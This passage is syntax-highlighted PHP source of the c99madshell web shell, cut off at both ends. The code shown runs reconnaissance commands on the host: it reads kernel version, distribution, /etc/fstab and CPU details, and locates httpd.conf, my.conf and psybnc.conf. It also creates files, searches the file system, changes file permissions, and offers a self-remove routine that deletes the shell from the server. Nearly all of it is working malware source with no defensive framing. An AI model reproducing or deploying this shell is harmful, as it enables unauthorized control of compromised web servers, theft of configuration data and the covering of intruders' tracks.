 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Kernel version?&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;sysctl -a | grep version&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Distrib name&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;cat /etc/issue.net&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Distrib name (2)&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;cat /etc/*-realise&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;CPU?&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;cat /proc/cpuinfo&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;RAM&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;free -m&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;HDD space&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;df -h&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;List of Attributes&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;lsattr -a&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Mount options &quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;cat /etc/fstab&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Is cURL installed?&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;which curl&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Is lynx installed?&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;which lynx&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Is links installed?&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;which links&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Is fetch installed?&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;which fetch&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Is GET installed?&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;which GET&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Is perl installed?&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;which perl&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Where is apache&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;whereis apache&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;Where is perl?&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;whereis perl&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;locate proftpd.conf&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;locate proftpd.conf&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;locate httpd.conf&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;locate httpd.conf&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;locate my.conf&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;locate my.conf&quot;</span><span class="p">));</span>
 <span class="nx">displaysecinfo</span><span class="p">(</span><span class="s2">&quot;locate psybnc.conf&quot;</span><span class="p">,</span><span class="nx">myshellexec</span><span class="p">(</span><span class="s2">&quot;locate psybnc.conf&quot;</span><span class="p">));</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;mkfile&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$mkfile</span> <span class="o">!=</span> <span class="nv">$d</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Make File </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;: object alredy exists&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Make File </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;: access denied&quot;</span><span class="p">;}</span>
  <span class="k">else</span> <span class="p">{</span><span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;f&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);</span> <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span> <span class="nv">$f</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$mkfile</span><span class="p">);}</span>
 <span class="p">}</span>
 <span class="k">else</span> <span class="p">{</span><span class="nv">$act</span> <span class="o">=</span> <span class="nv">$dspact</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;fsbuff&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$arr_copy</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">];</span>
 <span class="nv">$arr_cut</span> <span class="o">=</span> <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">];</span>
 <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$arr_copy</span><span class="p">,</span><span class="nv">$arr_cut</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$arr</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Buffer is empty!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File-System buffer&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span> <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">;</span> <span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;selfremove&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">((</span><span class="nv">$submit</span> <span class="o">==</span> <span class="nv">$rndcode</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$submit</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">unlink</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">))</span> <span class="p">{</span><span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="s2">&quot;Thanks for using c99madshell v.&quot;</span><span class="o">.</span><span class="nv">$shver</span><span class="o">.</span><span class="s2">&quot;!&quot;</span><span class="p">;</span> <span class="nx">c99shexit</span><span class="p">();</span> <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Can&#39;t delete &quot;</span><span class="o">.</span><span class="k">__FILE__</span><span class="o">.</span><span class="s2">&quot;!&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="p">}</span>
 <span class="k">else</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$rndcode</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error: incorrect confimation!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="nv">$rnd</span> <span class="o">=</span> <span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9</span><span class="p">);</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=act value=selfremove&amp;gt;&amp;lt;b&amp;gt;Self-remove: &quot;</span><span class="o">.</span><span class="k">__FILE__</span><span class="o">.</span><span class="s2">&quot; &amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Are you sure?&amp;lt;br&amp;gt;For confirmation, enter </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rnd</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;lt;/b&amp;gt;:&amp;nbsp;&amp;lt;input type=hidden name=rndcode value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rnd</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=text name=submit&amp;gt;&amp;nbsp;&amp;lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">YES</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;search&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Search in file-system:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_in</span> <span class="o">=</span> <span class="nv">$d</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_name</span> <span class="o">=</span> <span class="s2">&quot;(.*)&quot;</span><span class="p">;</span> <span class="nv">$search_name_regexp</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$search_text_wwo</span><span class="p">))</span> <span class="p">{</span><span class="nv">$search_text_regexp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="nv">$found</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
  <span class="nv">$found_d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nv">$found_f</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nv">$search_i_f</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nv">$search_i_d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="nv">$a</span> <span class="o">=</span> <span class="k">array</span>
  <span class="p">(</span>
   <span class="s2">&quot;name&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_name</span><span class="p">,</span> <span class="s2">&quot;name_regexp&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_name_regexp</span><span class="p">,</span>
   <span class="s2">&quot;text&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_text</span><span class="p">,</span> <span class="s2">&quot;text_regexp&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_text_regxp</span><span class="p">,</span>
   <span class="s2">&quot;text_wwo&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_text_wwo</span><span class="p">,</span>
   <span class="s2">&quot;text_cs&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_text_cs</span><span class="p">,</span>
   <span class="s2">&quot;text_not&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$search_text_not</span>
  <span class="p">);</span>
  <span class="nv">$searchtime</span> <span class="o">=</span> <span class="nx">getmicrotime</span><span class="p">();</span>
  <span class="nv">$in</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;;&quot;</span><span class="p">,</span><span class="nv">$search_in</span><span class="p">));</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$in</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nx">c99fsearch</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
  <span class="nv">$searchtime</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nv">$searchtime</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$found</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;No files found!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">else</span>
  <span class="p">{</span>
   <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$found</span><span class="p">;</span>
   <span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
   <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=POST&amp;gt;</span>
<span class="s2">&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">d</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dispd</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=act value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span>
<span class="s2">&amp;lt;b&amp;gt;Search for (file/folder name): &amp;lt;/b&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_name</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">)</span><span class="o">+</span><span class="mi">25</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$search_name</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_name_regexp</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$search_name_regexp</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; - regexp</span>
<span class="s2">&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Search in (explode </span><span class="se">\&quot;</span><span class="s2">;</span><span class="se">\&quot;</span><span class="s2">): &amp;lt;/b&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_in</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">)</span><span class="o">+</span><span class="mi">25</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span>
<span class="s2">&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;b&amp;gt;Text:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">search_text</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">122</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">10</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$search_text</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;</span>
<span class="s2">&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_text_regexp</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$search_text_regexp</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; - regexp</span>
<span class="s2">&amp;nbsp;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_text_wwo</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$search_text_wwo</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; - &amp;lt;u&amp;gt;w&amp;lt;/u&amp;gt;hole words only</span>
<span class="s2">&amp;nbsp;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_text_cs</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$search_text_cs</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; - cas&amp;lt;u&amp;gt;e&amp;lt;/u&amp;gt; sensitive</span>
<span class="s2">&amp;nbsp;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">search_text_not</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> &quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$search_text_not</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;gt; - find files &amp;lt;u&amp;gt;NOT&amp;lt;/u&amp;gt; containing the text</span>
<span class="s2">&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Search</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;ls&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dspact</span> <span class="o">=</span> <span class="nv">$act</span><span class="p">;</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;b&amp;gt;Search took &quot;</span><span class="o">.</span><span class="nv">$searchtime</span><span class="o">.</span><span class="s2">&quot; secs (&quot;</span><span class="o">.</span><span class="nv">$search_i_f</span><span class="o">.</span><span class="s2">&quot; files and &quot;</span><span class="o">.</span><span class="nv">$search_i_d</span><span class="o">.</span><span class="s2">&quot; folders, &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">((</span><span class="nv">$search_i_f</span><span class="o">+</span><span class="nv">$search_i_d</span><span class="p">)</span><span class="o">/</span><span class="nv">$searchtime</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; objects per second).&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;chmod&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$mode</span> <span class="o">=</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Change file-mode with error:&amp;lt;/b&amp;gt; can&#39;t get current value.&quot;</span><span class="p">;}</span>
 <span class="k">else</span>
 <span class="p">{</span>
  <span class="nv">$form</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$chmod_submit</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="nv">$octet</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="o">.</span><span class="nb">base_convert</span><span class="p">((</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$octet</span><span class="p">))</span> <span class="p">{</span><span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="nv">$form</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;}</span>
   <span class="k">else</span> <span class="p">{</span><span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;Can&#39;t chmod to &quot;</span><span class="o">.</span><span class="nv">$octet</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="p">;}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$form</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="nv">$perms</span> <span class="o">=</span> <span class="nx">parse_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">);</span>
